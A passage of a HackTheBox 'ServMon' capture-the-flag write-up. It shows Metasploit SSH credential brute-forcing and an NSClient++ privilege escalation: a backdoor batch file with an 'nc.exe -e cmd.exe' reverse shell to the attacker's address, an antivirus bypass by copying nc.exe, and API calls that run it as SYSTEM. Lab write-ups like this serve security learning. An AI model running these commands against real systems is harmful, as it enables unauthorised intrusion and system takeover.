</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msf5 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.184
</span></span><span class=line><span class=cl>RHOSTS =&gt; 10.10.10.184
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
</span></span><span class=line><span class=cl>PASS_FILE =&gt; /home/cyfun/.msf4/loot/20200611175532_default_10.10.10.184_nvms.traversal_675310.txt
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt
</span></span><span class=line><span class=cl>USER_FILE =&gt; /home/cyfun/CTF/HackTheBox/machines/ServMon/usernames.txt
</span></span><span class=line><span class=cl>msf5 auxiliary(scanner/ssh/ssh_login) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] 10.10.10.184:22 - Success: &#39;nadine:L1k3B1gBut7s@W0rk&#39; &#39;&#39;id&#39; is not recognized as an internal or external command,  operable program or batch file.  &#39;
</span></span><span class=line><span class=cl>[*] Command shell session 1 opened (10.10.15.26:45331 -&gt; 10.10.10.184:22) at 2020-06-11 18:10:19 +0200
</span></span><span class=line><span class=cl>[-] 10.10.10.184:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with &#39;set gatherproof off&#39;.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled in the future.
</span></span><span class=line><span class=cl>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span></code></pre></td></tr></table></div></div><p>So a valid set of credentials was <code>nadine:L1k3B1gBut7s@W0rk</code>.</p><p><a href=https://www.metasploit.com/>metasploit</a> automatically opened us a session but with <code>cmd.exe</code>. But I prefer
to have a powershell shell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh nadine@10.10.10.184 powershell.exe
</span></span><span class=line><span class=cl>nadine@10.10.10.184&#39;s password: 
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright (C) Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Try the new cross-platform PowerShell https://aka.ms/pscore6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\Users\Nadine&gt;
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s get our user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\Users\Nadine&gt; gc Desktop\user.txt
</span></span><span class=line><span class=cl>f9dc9b5ab530d6d295219c156662c3c9
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>Privilege Escalation through NSClient++: Nadine to NT Authority\SYSTEM<a hidden class=anchor aria-hidden=true href=#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>#</a></h3><p>Remember of the hypothesis I made about <code>NSClient++</code>. Let&rsquo;s read EDB-ID 46802
again.</p><p>We can use the CLI tool to display the password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\Users\Nadine&gt; cd &#34;C:\Program Files\NSClient++&#34;
</span></span><span class=line><span class=cl>PS C:\Program Files\NSClient++&gt; .\nscp web -- password --display
</span></span><span class=line><span class=cl>Current password: ew2x6SsGTxjRwXOT
</span></span></code></pre></td></tr></table></div></div><p>By trying to login with the password at https://10.10.10.184:8443/index.html
we are denied.</p><p>But if we read the config file <code>gc "c:\program files\nsclient++\nsclient.ini"</code>
we can see something.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ini data-lang=ini><span class=line><span class=cl><span class=c1># If you want to fill this file with all available options run the following command:</span>
</span></span><span class=line><span class=cl><span class=c1>#   nscp settings --generate --add-defaults --load-all</span>
</span></span><span class=line><span class=cl><span class=c1># If you want to activate a module and bring in all its options use:</span>
</span></span><span class=line><span class=cl><span class=c1>#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults</span>
</span></span><span class=line><span class=cl><span class=c1># For details run: nscp settings --help</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; in flight - TODO</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/default]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>password</span> <span class=o>=</span> <span class=s>ew2x6SsGTxjRwXOT</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>allowed hosts</span> <span class=o>=</span> <span class=s>127.0.0.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; in flight - TODO</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/NRPE/server]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>ssl options</span> <span class=o>=</span> <span class=s>no-sslv2,no-sslv3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>verify mode</span> <span class=o>=</span> <span class=s>peer-cert</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>insecure</span> <span class=o>=</span> <span class=s>false</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; in flight - TODO</span>
</span></span><span class=line><span class=cl><span class=k>[/modules]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>CheckHelpers</span> <span class=o>=</span> <span class=s>disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>CheckEventLog</span> <span class=o>=</span> <span class=s>disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>CheckNSCP</span> <span class=o>=</span> <span class=s>disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>CheckDisk</span> <span class=o>=</span> <span class=s>disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>CheckSystem</span> <span class=o>=</span> <span class=s>disabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>WEBServer</span> <span class=o>=</span> <span class=s>enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>NRPEServer</span> <span class=o>=</span> <span class=s>enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; CheckTaskSched - Check status of your scheduled jobs.</span>
</span></span><span class=line><span class=cl><span class=na>CheckTaskSched</span> <span class=o>=</span> <span class=s>enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA</span>
</span></span><span class=line><span class=cl><span class=na>Scheduler</span> <span class=o>=</span> <span class=s>enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; CheckExternalScripts - Module used to execute external scripts</span>
</span></span><span class=line><span class=cl><span class=na>CheckExternalScripts</span> <span class=o>=</span> <span class=s>enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/external scripts/wrappings]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Batch file - Command used for executing wrapped batch files</span>
</span></span><span class=line><span class=cl><span class=na>bat</span> <span class=o>=</span> <span class=s>scripts\\%SCRIPT% %ARGS%</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Visual basic script - Command line used for wrapped vbs scripts</span>
</span></span><span class=line><span class=cl><span class=na>vbs</span> <span class=o>=</span> <span class=s>cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts</span>
</span></span><span class=line><span class=cl><span class=na>ps1</span> <span class=o>=</span> <span class=s>cmd /c echo If (-Not (Test-Path &#34;scripts\%SCRIPT%&#34;) ) { Write-Host &#34;UNKNOWN: Script `&#34;%SCRIPT%`&#34; not found.&#34;; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/external scripts/scripts]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Schedules - Section for the Scheduler module.</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/scheduler/schedules]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; Undocumented key</span>
</span></span><span class=line><span class=cl><span class=na>foobar</span> <span class=o>=</span> <span class=s>command = foobar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>; External script settings - General settings for the external scripts module (CheckExternalScripts).</span>
</span></span><span class=line><span class=cl><span class=k>[/settings/external scripts]</span>
</span></span><span class=line><span class=cl><span class=na>allow arguments</span> <span class=o>=</span> <span class=s>true</span>
</span></span></code></pre></td></tr></table></div></div><p><code>allowed hosts = 127.0.0.1</code> tells us we can authenticate only from localhost.</p><p>But as we have an SSH access we can do some local port forwarding (you can read
about this technique on my <a href=https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/>article about pivoting</a>).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh nadine@10.10.10.184 -L 127.0.0.1:9999:127.0.0.1:8443 -N
</span></span></code></pre></td></tr></table></div></div><p>We map the local port 8443 on ServMon machine to local port 9999 on our machine.</p><p>Now we should be able to authenticate at https://127.0.0.1:9999/ with password
<code>ew2x6SsGTxjRwXOT</code>.</p><p>Now the exploit tell us to enable some modules:</p><ul><li>CheckExternalScripts</li><li>Scheduler</li></ul><p>Now let&rsquo;s prepare our backdoor script: <code>cyfun.bat</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=p>@</span><span class=k>echo</span> off
</span></span><span class=line><span class=cl>c<span class=p>:</span><span class=nl>\temp\nc.exe</span><span class=c1> 10.10.15.26 8888 -e cmd.exe</span>
</span></span></code></pre></td></tr></table></div></div><p>We can try to download the bat script with <a href=https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download>Certutil</a>
and a local HTTP server.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ python -m http.server --bind 10.10.15.26
</span></span></code></pre></td></tr></table></div></div><p>But that&rsquo;s a failure:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\Users\Nadine&gt; cd C:\temp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\temp&gt; certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat cyfun.bat
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ certutil.exe -urlcache -split -f http://10.10.15.26:8000/cyfun.bat no ...
</span></span><span class=line><span class=cl>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class=line><span class=cl>This script contains malicious content and has been blocked by your antivirus software.
</span></span><span class=line><span class=cl>    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
</span></span></code></pre></td></tr></table></div></div><p>We can&rsquo;t download our script because it&rsquo;s blocked by an AV. So let&rsquo;s create is on
the server directly.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\temp&gt; echo &#34;@echo off&#34; &gt; cyfun.bat
</span></span><span class=line><span class=cl>PS C:\temp&gt; echo &#34;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&#34; &gt;&gt; cyfun.bat
</span></span><span class=line><span class=cl>PS C:\temp&gt; gc cyfun.bat
</span></span><span class=line><span class=cl>@echo off
</span></span><span class=line><span class=cl>c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe
</span></span></code></pre></td></tr></table></div></div><p>I tried to download <code>nc.exe</code> with certutils but it was blocked by the AV too.</p><p>So I downloaded it via scp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ scp nc.exe nadine@10.10.10.184:/temp/nc.exe
</span></span></code></pre></td></tr></table></div></div><p>I tried to create the RCE via the webUI as in the exploit but wasn&rsquo;t successful.</p><ul><li>https://127.0.0.1:9999/index.html#/settings/settings/external%20scripts/scripts</li><li>https://127.0.0.1:9999/index.html#/settings/settings/scheduler/schedules</li></ul><p>So instead I created the task via the API:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:9999/api/v1/scripts/ext/scripts/cyfun.bat --data-binary &#34;c:\temp\nc.exe 10.10.15.26 8888 -e cmd.exe&#34;
</span></span><span class=line><span class=cl>Added cyfun as scripts\cyfun.bat
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ curl -s -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:9999/api/v1/queries/cyfun/commands/execute\?time\=1m
</span></span><span class=line><span class=cl>{&#34;command&#34;:&#34;cyfun&#34;,&#34;lines&#34;:[{&#34;message&#34;:&#34;Command cyfun didn&#39;t terminate within the timeout period 60s&#34;,&#34;perf&#34;:{}}],&#34;result&#34;:3}
</span></span></code></pre></td></tr></table></div></div><p>And finally got a privileged shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nc -nlp 8888
</span></span><span class=line><span class=cl>Microsoft Windows [Version 10.0.18363.752]
</span></span><span class=line><span class=cl>(c) 2019 Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:\Program Files\NSClient++&gt;whoami
</span></span><span class=line><span class=cl>nt authority\system
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:\Program Files\NSClient++&gt;type c:\users\administrator\desktop\root.txt
</span></span><span class=line><span class=cl>72c07cb24f21e63a855346edcd0816cb
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>